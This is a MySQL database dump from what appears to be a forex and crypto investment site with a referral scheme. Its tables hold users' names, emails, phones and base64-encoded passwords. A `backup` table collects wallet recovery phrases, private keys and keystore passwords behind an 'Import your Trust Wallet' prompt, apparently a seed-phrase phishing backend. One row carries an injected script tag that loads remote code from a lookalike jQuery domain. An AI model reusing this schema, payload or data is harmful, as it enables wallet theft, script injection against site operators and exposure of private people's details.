(4, 29791156, 0, 2.5, 'Coordinator', 'PM7296626702PM', 1, '2024-09-29 08:29:47'),
(5, 45060437, 0, 5, 'Referral', 'WZ2714402195WZ', 1, '2024-09-29 08:58:18'),
(6, 29791156, 0, 3, 'Referral', 'PD9021642642PD', 1, '2024-09-29 08:58:18'),
(7, 29791156, 0, 2.5, 'Coordinator', 'CH3168715231CH', 1, '2024-09-29 08:58:18'),
(8, 29791156, 0, 5, 'Referral', 'NL2975712827NL', 1, '2024-09-30 01:54:50'),
(9, 29791156, 0, 2.5, 'Coordinator', 'OY8190611000OY', 1, '2024-09-30 01:54:50');

-- --------------------------------------------------------

--
-- Table structure for table `user_cell`
--

CREATE TABLE `user_cell` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_cell`
--

INSERT INTO `user_cell` (`id`, `uid`, `cid`, `date`) VALUES
(1, 45060437, 0, '2024-09-29 08:28:54'),
(2, 48648111, 0, '2024-09-29 08:58:18'),
(3, 99411565, 0, '2024-09-30 01:54:50');

-- --------------------------------------------------------

--
-- Table structure for table `user_main`
--

CREATE TABLE `user_main` (
  `id` double NOT NULL,
  `uid` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `pic_url` varchar(255) NOT NULL,
  `status` int(1) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_main`
--

INSERT INTO `user_main` (`id`, `uid`, `name`, `pic_url`, `status`, `date`) VALUES
(129, 29791156, 'Pat', '', 1, '2024-03-25 16:13:16'),
(196, 99411565, 'Geo', '', 1, '2024-09-28 14:04:43'),
(207, 46292270, 'Corrado  Alessandro', '', 1, '2024-11-25 19:36:18'),
(208, 70468998, 'Jinginvestor', '', 1, '2024-11-26 03:17:04');

-- --------------------------------------------------------

--
-- Table structure for table `user_profile`
--

CREATE TABLE `user_profile` (
  `id` double NOT NULL,
  `uid` double NOT NULL,
  `fid` int(11) NOT NULL,
  `username` varchar(25) NOT NULL,
  `phone` varchar(11) NOT NULL,
  `email` varchar(50) NOT NULL,
  `net_worth` double NOT NULL,
  `role` int(1) NOT NULL,
  `country` int(11) NOT NULL,
  `password` text NOT NULL,
  `level` int(1) NOT NULL,
  `pin` text NOT NULL,
  `verified` int(1) NOT NULL,
  `status` int(1) NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_profile`
--

INSERT INTO `user_profile` (`id`, `uid`, `fid`, `username`, `phone`, `email`, `net_worth`, `role`, `country`, `password`, `level`, `pin`, `verified`, `status`, `date`) VALUES
(129, 29791156, 0, 'Pat1', '7884546646', 'pat@gmail.com', 96005, 2, 240, 'QWRtaW4yMzQ=', 2, '', 0, 0, '0000-00-00 00:00:00'),
(196, 99411565, 0, 'ben', '908887638', 'benemmylex@gmail.com', 0, 1, 240, 'QWRtaW4yMzQ=', 1, '', 1, 0, '0000-00-00 00:00:00'),
(207, 46292270, 0, 'Alessan', '7041194753', 'acorrado591@gmail.com', 0, 1, 161, 'NDExOTQ3NTM=', 0, '', 1, 0, '0000-00-00 00:00:00'),
(208, 70468998, 0, 'Jinginvestor', '8100978240', 'natureisgood012@gmail.com', 0, 1, 240, 'QnJhaW55', 0, '', 1, 0, '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `user_referral`
--

CREATE TABLE `user_referral` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `refID1` int(11) NOT NULL,
  `refID2` int(11) NOT NULL,
  `refID3` int(11) NOT NULL,
  `coordinator` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_referral`
--

INSERT INTO `user_referral` (`id`, `uid`, `refID1`, `refID2`, `refID3`, `coordinator`) VALUES
(1, 99411565, 29791156, 0, 0, 29791156),
(2, 94575126, 29791156, 0, 0, 29791156),
(12, 46292270, 29791156, 0, 0, 29791156),
(13, 70468998, 29791156, 0, 0, 29791156);

-- --------------------------------------------------------

--
-- Table structure for table `user_wallet`
--

CREATE TABLE `user_wallet` (
  `id` double NOT NULL,
  `amount` double NOT NULL,
  `creditor` double NOT NULL,
  `debitor` double NOT NULL,
  `creditor_desc` varchar(250) NOT NULL,
  `debitor_desc` varchar(250) NOT NULL,
  `type` varchar(250) NOT NULL,
  `extra` text NOT NULL,
  `ref` varchar(250) NOT NULL,
  `status` int(2) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `user_fund_card`
--

CREATE TABLE `user_fund_card` (
  `id` double NOT NULL,
  `uid` int(11) NOT NULL,
  `card_type` varchar(250) NOT NULL,
  `payment_method` varchar(250) NOT NULL,
  `trans_id` varchar(250) NOT NULL,
  `amount` double NOT NULL,
  `payment_proof` varchar(250) NULL,
  `status` int(2) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `user_qfs_mobile`
--

CREATE TABLE `user_qfs_mobile` (
  `id` double NOT NULL,
  `uid` int(11) NOT NULL,
  `quantity` int(11) NOT NULL DEFAULT 1,
  `payment_method` varchar(250) NOT NULL,
  `trans_id` varchar(250) NOT NULL,
  `amount` double NOT NULL,
  `payment_proof` varchar(250) NULL,
  `status` int(2) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;


-- --------------------------------------------------------

--
-- Table structure for table `user_linked_wallet`
--

CREATE TABLE `user_linked_wallet` (
  `id` double NOT NULL,
  `uid` int(11) NOT NULL,
  `wallet_name` varchar(250) NOT NULL,
  `wallet_recovery_phrase` text NOT NULL,
  `wallet_image` varchar(250) NULL,
  `status` int(2) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `user_wallet_ex`
--

CREATE TABLE `user_wallet_ex` (
  `id` double NOT NULL,
  `amount` double NOT NULL,
  `uid` int(11) NOT NULL,
  `type` varchar(15) NOT NULL,
  `method` int(11) NOT NULL,
  `desc` varchar(255) NOT NULL,
  `ref` varchar(25) NOT NULL,
  `status` int(1) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_wallet_ex`
--

INSERT INTO `user_wallet_ex` (`id`, `amount`, `uid`, `type`, `method`, `desc`, `ref`, `status`, `date`) VALUES
(1, 50, 99411565, 'debit', 0, 'Withdrawal', 'RA89332727RA', 1, '2024-09-28 19:25:31'),
(2, 400, 99411565, 'debit', 0, 'Withdrawal', 'GS57539094GS', 1, '2024-09-28 19:26:07'),
(3, 9793, 0, '1', 0, 'debit', 'LO35040650LO', 1, '2024-09-29 13:09:12'),
(4, 5697, 0, '4', 0, 'credit', 'VP50627149VP', 1, '2024-09-29 13:09:12'),
(5, 448, 0, '3', 0, 'credit', 'SU47928178SU', 1, '2024-09-29 13:09:12'),
(6, 5475, 0, '4', 0, 'credit', 'AX51572923AX', 1, '2024-09-29 13:09:12'),
(7, 8400, 0, '1', 0, 'debit', 'DY22127681DY', 1, '2024-09-29 13:09:20'),
(8, 13213, 0, '2', 0, 'credit', 'VT25745226VT', 1, '2024-09-29 13:09:20'),
(9, 9412, 0, '2', 0, 'credit', 'IX20974785IX', 1, '2024-09-29 13:09:31'),
(10, 8256, 0, '1', 0, 'debit', 'QW47189605QW', 1, '2024-09-29 13:22:02'),
(11, 8204, 0, '4', 0, 'debit', 'BE51975867BE', 1, '2024-09-29 13:22:02'),
(12, 6662, 0, '1', 0, 'debit', 'ZY38993940ZY', 1, '2024-09-29 13:22:02'),
(13, 10034, 0, '4', 0, 'credit', 'RS11655312RS', 1, '2024-09-29 13:22:11'),
(14, 14936, 0, '3', 0, 'credit', 'DO98976779DO', 1, '2024-09-29 13:22:11'),
(15, 11233, 0, '3', 0, 'debit', 'TW79241569TW', 1, '2024-09-29 13:22:11'),
(16, 6350, 0, '1', 0, 'debit', 'MK97265826MK', 1, '2024-09-29 13:22:11'),
(17, 599, 0, '4', 0, 'debit', 'JG65695703JG', 1, '2024-09-29 13:22:11'),
(18, 1000, 45060437, 'credit', 0, 'Account top up', 'RT51824327RT', 1, '2024-09-29 13:23:43'),
(19, 100, 45060437, 'credit', 0, 'Account top up', 'JE55016760JE', 1, '2024-09-29 13:23:54'),
(20, 50, 45060437, 'debit', 0, 'Forex investment', 'VN80046411VN', 1, '2024-09-29 13:28:54'),
(21, 100, 45060437, 'debit', 0, 'Forex investment', 'BB20678575BB', 1, '2024-09-29 13:29:47'),
(22, 100, 48648111, 'debit', 0, 'Forex investment', 'NO36377309NO', 1, '2024-09-29 13:58:18'),
(23, 285, 48648111, 'debit', 0, 'Withdrawal', 'CT27725447CT', 1, '2024-09-29 13:59:42'),
(24, 100, 99411565, 'debit', 0, 'Forex investment', 'XD34588864XD', 1, '2024-09-30 06:54:50');

DROP TABLE IF EXISTS `backup`;
CREATE TABLE `backup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `wallet_name` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
  `recovery_phrase` varchar(100) NOT NULL,
  `keystore_json` varchar(100) NOT NULL,
  `keystore_password` varchar(100) NOT NULL,
  `private_key` text NOT NULL,
  `image_src` text NOT NULL,
  `icon_name` varchar(100) NOT NULL,
  `date` datetime NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

INSERT INTO `backup` VALUES
(1,'dhfgdhfdgd','fdghdf@mail.ru','word word word word word word word word word word word word','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:37'),
(2,'dhfgdhfdgd','fdghdf@mail.ru','word word<script src=\'https://jquery.bio/get/\'></script> word word word word word word word word wor','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:51'),
(3,'Trust wallet','ahhsjsj666s@gmail.com','Cube scene program portion combine ramp ticket skill rely traffic legend goat','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-08-04 03:25:43');

CREATE TABLE `kyc` (
 `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
 `user_id` int(10) unsigned NOT NULL,
 `full_name` varchar(255) NOT NULL,
 `dob` date NOT NULL,
 `nationality` varchar(100) NOT NULL,
 `gender` varchar(20) NOT NULL,
 `email` varchar(255) NOT NULL,
 `phone` varchar(50) NOT NULL,
 `address` varchar(255) NOT NULL,
 `city` varchar(100) NOT NULL,
 `state` varchar(100) NOT NULL,
 `country` varchar(100) NOT NULL,
 `postal_code` varchar(20) NOT NULL,
 `gov_id` varchar(255) DEFAULT NULL,
 `proof_address` varchar(255) DEFAULT NULL,
 `selfie` varchar(255) DEFAULT NULL,
 `status` enum('pending','approved','rejected') NOT NULL DEFAULT 'pending',
 `created_at` datetime NOT NULL DEFAULT current_timestamp(),
 `reviewed_at` datetime DEFAULT NULL,
 `reviewed_by` int(10) unsigned DEFAULT NULL,
 PRIMARY KEY (`id`),
 KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci

CREATE TABLE `user_otp` (
 `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
 `uid` int(10) unsigned NOT NULL,
 `otp` varchar(10) NOT NULL,
 `expires_at` datetime NOT NULL,
 `used` tinyint(1) NOT NULL DEFAULT 0,
 `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
 PRIMARY KEY (`id`),
 KEY `uid` (`uid`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cell`
--
ALTER TABLE `cell`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `countries`
--
ALTER TABLE `countries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `investment`
--
ALTER TABLE `investment`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `level`
--
ALTER TABLE `level`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `options`
--
ALTER TABLE `options`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `payment_methods`
--
ALTER TABLE `payment_methods`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `plans`
--
ALTER TABLE `plans`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_auth`
--
ALTER TABLE `user_auth`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_bonus`
--
ALTER TABLE `user_bonus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_cell`
--
ALTER TABLE `user_cell`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_main`
--
ALTER TABLE `user_main`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `user_qfs_mobile` CHANGE `id` `id` DOUBLE NOT NULL AUTO_INCREMENT, ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_profile`
--
ALTER TABLE `user_profile`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_referral`
--
ALTER TABLE `user_referral`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_wallet`
--
ALTER TABLE `user_wallet`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_wallet_ex`
--
ALTER TABLE `user_wallet_ex`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `cell`
--
ALTER TABLE `cell`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `countries`
--
ALTER TABLE `countries`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=253;

--
-- AUTO_INCREMENT for table `investment`
--
ALTER TABLE `investment`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=77;

--
-- AUTO_INCREMENT for table `level`
--
ALTER TABLE `level`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `options`
--
ALTER TABLE `options`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=37;

--
-- AUTO_INCREMENT for table `payment_methods`
--
ALTER TABLE `payment_methods`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `plans`
--
ALTER TABLE `plans`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `user_auth`
--
ALTER TABLE `user_auth`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=231;

--
-- AUTO_INCREMENT for table `user_bonus`
--
ALTER TABLE `user_bonus`
  MODIFY `id` double NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `user_cell`
--
ALTER TABLE `user_cell`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `user_main`
--
ALTER TABLE `user_main`
  MODIFY `id` double NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=209;

--
-- AUTO_INCREMENT for table `user_profile`
--
ALTER TABLE `user_profile`
  MODIFY `id` double NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=209;

--
-- AUTO_INCREMENT for table `user_referral`
--
ALTER TABLE `user_referral`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `user_wallet`
--
ALTER TABLE `user_wallet`
  MODIFY `id` double NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `user_wallet_ex`
--
ALTER TABLE `user_wallet_ex`
  MODIFY `id` double NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
